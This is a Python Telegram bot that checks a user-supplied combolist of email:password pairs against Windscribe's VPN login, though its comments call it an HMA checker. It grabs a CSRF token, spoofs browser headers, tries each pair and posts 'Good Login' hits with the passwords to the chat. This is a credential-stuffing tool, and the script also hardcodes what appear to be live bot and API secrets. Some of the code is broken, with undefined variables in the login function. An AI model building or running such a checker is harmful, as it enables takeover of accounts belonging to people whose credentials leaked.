from pyrogram import Client, filters
import requests
import requests,re
import pyromod
from pyrogram.types import Message
import os

# Telegram bot token (replace with your bot token)
BOT_TOKEN = "6909039567:AAFxWc8oVejhey2Y9hophG5__L72tjEQqw0"
api_id = 6590520
api_hash = "7f31db7e8cd1c0959c187e2651935c00"
# Initialize Pyrogram client
app = Client("hma_bot", api_id=api_id, api_hash=api_hash, bot_token=BOT_TOKEN)

def hma_login(email, password):
    try:
    	url = "https://res.windscribe.com/res/logintoken"
    	headers = {
       "origin": "https://windscribe.com",
       "priority": "u=1, i",
       "referer": "https://windscribe.com/",
       "sec-ch-ua": 'Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
       "sec-ch-ua-mobile": "?0", 
       "sec-ch-ua-platform": "Windows",
       "sec-fetch-dest": "empty",
       "sec-fetch-mode": "cors", 
       "sec-fetch-site": "same-site",
       "sec-gpc": "1", 
       "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" 
        }
    	res_post = requests.post(url,headers=headers)
    	csrf_token = res_post.text.split('csrf_token":"')[1].split('"')[0]
    	csrf_time = res_post.text.split('csrf_time":')[1].split('}')[0]
    	data = {"login":1,"upgrade":0,"csrf_time":csrf_time,"csrf_token":csrf_token,"username":user,"password":pasw,"code":""}
    	res_login = requests.post("https://windscribe.com/login",data=data,headers=headers)
        if "Account Overview" in res_login.text or "Account Status" in res_login.text:
            return True, "Login successful."
        else:
            return False, "Invalid credentials."
    except Exception as e:
        return False, f"Login Failed: {str(e)}"

# Command handler to check HMA VPN accounts using a combolist file
@app.on_message(filters.command(["hma"]))
async def trans(client, m: Message):
    try:
        editable = await m.reply_text("**Send Text file **")
        input_msg: Message = await app.listen(editable.chat.id)
        x = await input_msg.download()
        path = f"./downloads/"
        editable = await m.reply_text("Starting Account Checking.........")

        # Read the file and initialize progress
        with open(x, 'r') as file:
            lines = file.readlines()
        total_accounts = len(lines)

        # Calculate interval for 1% progress
        progress_interval = max(1, total_accounts // 100)
        progress = 0
        next_progress_threshold = progress_interval

        for index, line in enumerate(lines):
            line = line.strip()
            if ':' in line:
                email, password = line.split(':', 1)
                success, message = hma_login(email, password)
                if success:
                    result_message = f"Good Login for {email} : {password}"
                    await app.send_message(m.chat.id, result_message)
                else:
                    result_message = f"Bad Login for {email}: {password} - {message}"
            else:
                result_message = f"Invalid line format: {line}"

            

            # Update progress and send message if necessary
            if index + 1 >= next_progress_threshold:
                percent_complete = (index + 1) / total_accounts * 100
                await app.send_message(
                    m.chat.id,
                    f"Progress: {percent_complete:.1f}% ({index + 1}/{total_accounts} accounts checked)"
                )
                next_progress_threshold += progress_interval

        await app.send_message(m.chat.id, "DONE CHECKING")

        # Clean up downloaded file
        os.remove(x)
    except Exception as e:
        await app.send_message(m.chat.id, f"An error occurred: {str(e)}")

# Start the bot
if __name__ == "__main__":
    app.run()
